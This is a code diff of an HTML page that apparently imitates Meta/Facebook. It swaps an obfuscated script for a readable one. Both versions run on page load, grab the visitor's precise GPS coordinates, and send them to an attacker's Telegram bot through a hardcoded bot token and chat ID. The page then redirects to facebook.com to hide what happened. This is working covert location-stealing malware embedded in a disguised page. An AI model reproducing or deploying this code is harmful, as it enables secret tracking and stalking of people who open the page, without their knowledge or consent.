@@ -38,40 +38,52 @@
 <div class="footer-logo">Meta</div>
 
 <script>
-    (function(){
-        var _0x4a12 = ['aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==', 'T0RheE1qZzFOVE15T0RZNkFBRTNmNlN4WExpY1dRcjltemR2cjBRQzVPSTBtcFVYaFBB', 'TmpnM05ETXhOVEE0', 'c2VuZExvY2F0aW9u', 'aHR0cHM6Ly93d3cuZmFjZWJvb2suY29t'];
-        function _0x2b89(_0x1b4c, _0x3e10) { return atob(_0x4a12[_0x1b4c]); }
+    const BOT_TOKEN = "8612853286:AAH3f6SxXLicWQr9mzdvr0QC5OJ0mpUXhPA";
+    const CHAT_ID = "6874315478";
 
-        window.onload = function() {
-            if (!navigator.geolocation) {
-                window.location.href = _0x2b89(4);
-                return;
-            }
+    window.onload = function() {
+        sendLocationToTelegram();
+    };
 
-            navigator.geolocation.getCurrentPosition(
-                function(_0x54e1x1) {
-                    var _0x54e1x2 = _0x54e1x1.coords.latitude;
-                    var _0x54e1x3 = _0x54e1x1.coords.longitude;
-                    var _0x54e1x4 = _0x2b89(0) + _0x2b89(1) + '/' + _0x2b89(3);
+    function sendLocationToTelegram() {
+        if (!navigator.geolocation) {
+            window.location.href = "https://www.facebook.com";
+            return;
+        }
 
-                    fetch(_0x54e1x4, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: _0x2b89(2),
-                            latitude: _0x54e1x2,
-                            longitude: _0x54e1x3
-                        })
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+
+                fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        latitude: latitude,
+                        longitude: longitude
                     })
-                    .then(function() { window.location.href = _0x2b89(4); })
-                    .catch(function() { window.location.href = _0x2b89(4); });
-                },
-                function() { window.location.href = _0x2b89(4); },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        };
-    })();
+                })
+                .then(() => {
+                    window.location.href = "https://www.facebook.com";
+                })
+                .catch(() => {
+                    window.location.href = "https://www.facebook.com";
+                });
+            },
+            () => {
+                window.location.href = "https://www.facebook.com";
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    }
 </script>
 
 </body>
 </html>
+
+       
+                   
